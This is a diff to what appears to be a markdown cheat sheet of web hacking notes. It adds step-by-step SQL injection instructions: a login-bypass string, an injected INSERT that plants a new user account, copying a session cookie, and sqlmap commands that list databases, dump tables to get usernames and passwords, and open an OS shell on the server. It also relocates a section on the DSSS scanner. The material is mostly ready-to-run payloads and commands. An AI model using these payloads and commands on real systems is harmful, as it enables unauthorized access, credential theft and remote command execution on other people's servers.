@@ -342,26 +342,35 @@ run
 ```
   </details>
 <details>
+
+ Summary
+ ```console
+1- Auth Bypass-  hi'OR 1=1 --
+
+2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
+
+3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
+Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
+
+4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
+
+5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
+
+6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
+
+6.1 In the shell type-   TASKLIST  (to view the tasks)
+
+6.2 Use systeminfo for windows to get all os version
+
+6.3 Use uname -a for linux to get os version
+```
   <summary>SQL Injection</summary>
   
   ## SQL Injection
   
   * Login bypass with [' or 1=1 --]
   
-### DSSS
-  
-  * Damn Small SQLi Scanner ([DSSS](https://github.com/stamparm/DSSS)) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters)
-
-  * As of optional settings it supports HTTP proxy together with HTTP header values User-Agent, Referer and Cookie.
-
-  ```console
-  python3 dsss.py -u "url" --cookie="cookie"
-  ```
-  <img src="/IMG/DSSS/dsss1.jpg" />
-  
-  * Open the binded URL
-  
-  <img src="/IMG/DSSS/dsss2.jpg" />
 
 ### SQLMAP
   
@@ -386,6 +395,24 @@ run
 ```console
   sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
 ```
+
+### DSSS
+  
+  * Damn Small SQLi Scanner ([DSSS](https://github.com/stamparm/DSSS)) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters)
+
+  * As of optional settings it supports HTTP proxy together with HTTP header values User-Agent, Referer and Cookie.
+
+  ```console
+  python3 dsss.py -u "url" --cookie="cookie"
+  ```
+  <img src="/IMG/DSSS/dsss1.jpg" />  
+
+  
+  * Open the binded URL
+  
+  <img src="/IMG/DSSS/dsss2.jpg" />  
+
+  
   </details>
 
 
